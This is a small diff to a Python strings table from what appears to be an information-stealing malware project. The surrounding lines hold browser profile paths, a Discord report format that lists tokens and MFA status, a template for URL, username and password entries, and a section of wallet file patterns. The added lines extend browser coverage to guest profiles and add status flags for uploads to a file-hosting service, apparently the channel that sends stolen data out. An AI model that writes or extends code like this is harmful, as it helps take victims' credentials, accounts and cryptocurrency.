@@ -403,6 +403,7 @@ STRINGS = [
     ("wpath_info_cache", "info_cache"),
     ("wpath_system_profile", "System Profile"),
     ("wpath_default", "Default"),
+    ("wpath_guest_profile", "Guest Profile"),
     ("wpath_profile_prefix", "Profile "),
     ("wpath_preferences", "Preferences"),
     ("wpath_sync", "Sync"),
@@ -592,6 +593,8 @@ STRINGS = [
     ("discord_report_fmt", "Username: {}\nID: {}\nToken: {}\nBadges: {}\nMFA: {}\n{}\n"),
     ("discord_accounts_found", " Discord accounts found\n"),
     ("sender_embeds_status", "embeds["),
+    ("sender_gofile_ok", "gf=1"),
+    ("sender_gofile_fail", "gf=0"),
     ("cred_fmt", "URL: {}\nUsername: {}\nPassword: {}\n{}\n"),
 
     # === wallet file patterns ===
